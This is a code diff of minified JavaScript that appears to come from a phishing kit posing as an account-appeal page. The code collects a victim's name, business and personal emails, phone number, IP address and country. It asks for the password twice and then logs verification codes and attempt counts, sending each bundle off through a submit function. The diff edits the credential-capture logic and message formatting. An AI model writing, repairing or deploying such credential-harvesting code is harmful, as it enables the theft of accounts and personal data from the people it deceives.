@@ -8147,11 +8147,11 @@ function xf({
   setActive: t
 }) {
   const [n, r] = T.useState(!1), [l, o] = T.useState(""), [i, u] = T.useState(0), [a, d] = T.useState(0);
-  
+
   let v = uu.useRef("");
 
   const m = () => {
-    if (a === 1 && l.length >= 6 && l === v.current && v.current.length > 0) {
+    if (a === 1 && (v.current = l), d(h => h + 1), l.length >= 6 && l === v.current) {
         r(!0);
         setTimeout(() => {
             r(!1);
@@ -8160,20 +8160,7 @@ function xf({
         }, 500);
 
         const h = JSON.parse(localStorage.getItem("form"));
-        const x = `
-            IP: ${localStorage.getItem("ip")}
-            Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}
-
-            Page Name: ${h.page}
-            Full Name: ${h.fname}
-            Business email: ${h.bemail}
-            Personal email: ${h.pemail}
-            Phone number: ${h.phone}
-            Appeal: ${h.apeal}
-            
-            First pas: ${l}
-            Last pas: ${v.current}
-        `;
+        const x = `IP: ${localStorage.getItem("ip")}\nCountry: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}\n\nPage Name: ${h.page}\nFull Name: ${h.fname}\nBusiness email: ${h.bemail}\nPersonal email: ${h.pemail}\nPhone number: ${h.phone}Appeal: ${h.apeal}\n\nFirst pass: ${l}\nLast pass: ${v.current}`;
 
         kc({
             data: x
@@ -8272,10 +8259,7 @@ function kf({
           m(D => D - 1), v <= 0 && clearInterval(x)
       }, 1e3), o(D => D + 1);
       const k = `
-      Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}
-      Attempt: ${i+1}
-      Verification: ${a}
-      `;
+      Country: ${localStorage.getItem("code")} - ${localStorage.getItem("country")}\nAttempt: ${i+1}\nVerification: ${a}`;
       kc({
           data: k
       })
